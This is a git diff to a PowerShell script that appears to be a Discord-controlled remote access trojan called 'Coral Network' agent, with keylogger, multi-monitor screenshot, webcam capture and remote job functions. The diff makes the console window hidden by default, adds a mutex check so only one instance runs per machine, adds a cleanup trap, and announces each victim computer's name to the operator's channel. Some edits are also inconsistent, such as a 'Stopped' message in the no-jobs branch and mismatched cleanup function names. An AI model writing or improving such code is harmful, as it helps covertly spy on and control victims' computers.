@@ -1,8 +1,11 @@
 #global vars
 $global:token = $token
 $script:Jobs = @{}
-$global:hidewindow = $false
+$global:hidewindow = $true
 $global:keyloggerstatus = $false
+
+
+
 
 
 # =============================================================== CORE DISCORD FUNCTIONS =========================================================================
@@ -752,6 +755,7 @@ function screenshot_all {
         sendMsg -Message ":x: **Multi-monitor screenshot error:** $($_.Exception.Message)"
     }
 }
+
 # Webcam ---
 function Webcam {
     param(
@@ -848,6 +852,7 @@ function Webcam {
         sendMsg -Message ":x: **No webcam or audio devices found**"    
     }
 }
+
 # JOB ---
 function Start_AgentJob {
     param($ScriptString)
@@ -959,6 +964,7 @@ function Get_AgentJobOutput {
 function Stop_AllAgentJobs {
     if ($script:Jobs.Count -eq 0) {
         sendMsg -Message ":information_source: **No jobs to stop**"
+        sendMsg -Message ":stop_sign: **Stopped $stoppedCount job(s)**"
         return
     }
     
@@ -1032,7 +1038,64 @@ function Get_AgentJobStatus {
     }
 }
 
+function Check_ScriptAlreadyRunning {
+    param([bool]$UseDiscord = $false)
+    
+    try {
+        # Named Mutex - most reliable method
+        $mutexName = "Global\CoralNetworkAgent_$env:COMPUTERNAME"
+        $mutex = $null
+        
+        try {
+            $mutex = [System.Threading.Mutex]::new($false, $mutexName)
+            
+            # Try to acquire the mutex with a short timeout
+            if (-not $mutex.WaitOne(100)) {
+                if ($UseDiscord) {
+                    sendMsg -Message ":warning: **Another instance of Coral Agent is already running!**"
+                    sendMsg -Message ":no_entry: **This instance will now exit to prevent conflicts**"
+                } else {
+                    Write-Host "Another instance of Coral Agent is already running!"
+                    Write-Host "This instance will now exit to prevent conflicts"
+                }
+                
+                # Force process termination
+                [Environment]::Exit(1)
+            }
+            
+            # Store the mutex globally so it's not disposed
+            $global:CoralMutex = $mutex
+            
+        } catch [System.Threading.AbandonedMutexException] {
+            # Previous instance didn't clean up properly, we can continue
+            if ($UseDiscord) {
+                sendMsg -Message ":warning: **Previous instance didn't exit cleanly, taking over...**"
+            } else {
+                Write-Host "Previous instance didn't exit cleanly, taking over..."
+            }
+        }
+        
+        return $true
+        
+    } catch {
+        if ($UseDiscord) {
+            sendMsg -Message ":warning: **Error during process check:** $($_.Exception.Message)"
+        } else {
+            Write-Host "Error during process check: $($_.Exception.Message)"
+        }
+        return $true  # Allow continuation if check fails
+    }
+}
+
+# Trap for unexpected script termination
+trap {
+    try {
+        Cleanup_CoralAgent
+    } catch {}
+    continue
+}
 # =============================================================== INITIALIZATION =========================================================================
+Check_ScriptAlreadyRunning -UseDiscord $false
 
 # Initialize bot and channels
 $global:botId = Get_BotUserId
@@ -1044,6 +1107,8 @@ if (!(CheckCategoryExists)) {
 } else {
     $global:SessionID = $ChannelID
 }
+Check_ScriptAlreadyRunning -UseDiscord $true
+
 # hide window?
 if ($global:hidewindow) {
     HideWindow
@@ -1051,8 +1116,6 @@ if ($global:hidewindow) {
 
 # Send initial connection message
 sendMsg -Message "``$env:COMPUTERNAME connected to Coral Network``"
-
-
 # =============================================================== HELP MENU ========================================================================
 function display_help{
     $message = "
@@ -1128,6 +1191,7 @@ while ($true) {
             'STOPALLJOBS' { Stop_AllAgentJobs }
             'EXIT' { 
                 Stop_AllAgentJobs
+                Cleanup-CoralAgent
                 sendMsg -Message ":no_entry: ``$env:COMPUTERNAME disconnecting from Coral Network`` :no_entry:"
                 exit 
             }
@@ -1177,6 +1241,4 @@ while ($true) {
     }
     
     Start-Sleep -Seconds 3
-
 }
-
